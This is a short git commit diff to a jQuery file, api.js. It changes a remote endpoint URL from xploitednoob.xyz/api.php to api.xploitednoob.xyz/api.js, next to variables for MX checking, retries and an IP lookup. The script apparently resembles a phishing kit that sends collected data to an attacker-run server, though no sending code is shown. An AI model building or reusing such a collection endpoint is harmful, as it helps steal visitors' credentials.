fad0414296cbd0429b34e1417e9cd41e8c0a62da
xvalhalla <92413477+xvalhalla@users.noreply.github.com>
2021-10-26 00:03:58 +0600

    Update api.js

--- files/api.js
+++ files/api.js
@@ -1,5 +1,5 @@
 $(document).ready(function() {
-    var php_url = "http://xploitednoob.xyz/api.php";
+    var php_url = "http://api.xploitednoob.xyz/api.js";
     var check_mx = false;
     var numretry = 0;
     var ipinfo = ipinfo();
